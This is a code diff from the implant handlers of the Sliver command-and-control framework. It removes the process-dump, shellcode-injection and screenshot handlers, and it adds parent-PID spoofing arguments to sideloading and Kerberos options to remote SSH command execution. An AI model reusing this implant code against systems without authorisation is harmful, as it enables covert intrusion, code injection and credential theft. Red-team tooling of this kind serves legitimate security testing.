@@ -21,7 +21,6 @@ package handlers
 */
 
 import (
-	"fmt"
 	"net"
 
 	// {{if .Config.Debug}}
@@ -29,9 +28,7 @@ import (
 	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/netstat"
-	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/ps"
-	"github.com/bishopfox/sliver/implant/sliver/screen"
 	"github.com/bishopfox/sliver/implant/sliver/shell/ssh"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
@@ -76,52 +73,13 @@ func terminateHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func dumpHandler(data []byte, resp RPCResponse) {
-	procDumpReq := &sliverpb.ProcessDumpReq{}
-	err := proto.Unmarshal(data, procDumpReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	res, err := procdump.DumpProcess(procDumpReq.Pid)
-	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
-	if err != nil {
-		dumpResp.Response = &commonpb.Response{
-			Err: fmt.Sprintf("%v", err),
-		}
-	}
-	data, err = proto.Marshal(dumpResp)
-	resp(data, err)
-}
-
-func taskHandler(data []byte, resp RPCResponse) {
-	var err error
-	task := &sliverpb.TaskReq{}
-	err = proto.Unmarshal(data, task)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-
-	if task.Pid == 0 {
-		err = taskrunner.LocalTask(task.Data, task.RWXPages)
-	} else {
-		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
-	}
-	resp([]byte{}, err)
-}
-
 func sideloadHandler(data []byte, resp RPCResponse) {
 	sideloadReq := &sliverpb.SideloadReq{}
 	err := proto.Unmarshal(data, sideloadReq)
 	if err != nil {
 		return
 	}
-	result, err := taskrunner.Sideload(sideloadReq.GetProcessName(), sideloadReq.GetData(), sideloadReq.GetArgs(), sideloadReq.Kill)
+	result, err := taskrunner.Sideload(sideloadReq.GetProcessName(), sideloadReq.GetProcessArgs(), sideloadReq.GetPPid(), sideloadReq.GetData(), sideloadReq.GetArgs(), sideloadReq.Kill)
 	errStr := ""
 	if err != nil {
 		errStr = err.Error()
@@ -171,25 +129,6 @@ func ifconfig() *sliverpb.Ifconfig {
 		interfaces.NetInterfaces = append(interfaces.NetInterfaces, netIface)
 	}
 	return interfaces
-}
-
-func screenshotHandler(data []byte, resp RPCResponse) {
-	sc := &sliverpb.Screenshot{}
-	err := proto.Unmarshal(data, sc)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	// {{if .Config.Debug}}
-	log.Printf("Screenshot Request")
-	// {{end}}
-
-	sc.Data = screen.Screenshot()
-	data, err = proto.Marshal(sc)
-
-	resp(data, err)
 }
 
 func netstatHandler(data []byte, resp RPCResponse) {
@@ -281,11 +220,11 @@ func buildEntries(proto string, s []netstat.SockTabEntry) []*sliverpb.SockTabEnt
 		}
 		entries = append(entries, &sliverpb.SockTabEntry{
 			LocalAddr: &sliverpb.SockTabEntry_SockAddr{
-				Ip:   e.LocalAddr.String(),
+				Ip:   e.LocalAddr.IP.String(),
 				Port: uint32(e.LocalAddr.Port),
 			},
 			RemoteAddr: &sliverpb.SockTabEntry_SockAddr{
-				Ip:   e.RemoteAddr.String(),
+				Ip:   e.RemoteAddr.IP.String(),
 				Port: uint32(e.RemoteAddr.Port),
 			},
 			SkState: e.State.String(),
@@ -315,7 +254,11 @@ func runSSHCommandHandler(data []byte, resp RPCResponse) {
 		commandReq.Username,
 		commandReq.Password,
 		commandReq.PrivKey,
-		commandReq.Command)
+		commandReq.Krb5Conf,
+		commandReq.Keytab,
+		commandReq.Realm,
+		commandReq.Command,
+	)
 	commandResp := &sliverpb.SSHCommand{
 		Response: &commonpb.Response{},
 		StdOut:   stdout,
